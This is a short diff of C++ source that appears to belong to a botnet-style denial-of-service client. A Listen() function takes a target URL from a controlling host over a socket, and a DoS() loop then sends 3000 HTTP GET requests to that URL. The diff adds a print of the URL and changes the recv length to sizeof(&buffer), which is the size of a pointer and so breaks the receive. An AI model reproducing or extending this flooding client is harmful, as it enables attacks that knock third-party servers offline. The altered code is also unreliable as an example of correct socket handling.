@@ -31,6 +31,7 @@ void DoS() {
 	stringstream ss;
 	ss << buffer;
 	ss >> url;
+	cout << url;
 
 	for (int i = 0; i < 3000; i++) {
 		cpr::Get(cpr::Url{ url });
@@ -70,7 +71,7 @@ void ConnectSocket() {
 
 void Listen() {
 	cout << "Listening to the host" << endl;
-	recv(sock, buffer, sizeof(buffer), 0);
+	recv(sock, buffer, sizeof(&buffer), 0);
 	if (strstr(buffer, "http")) {
 		CloseSocket();
 		return;
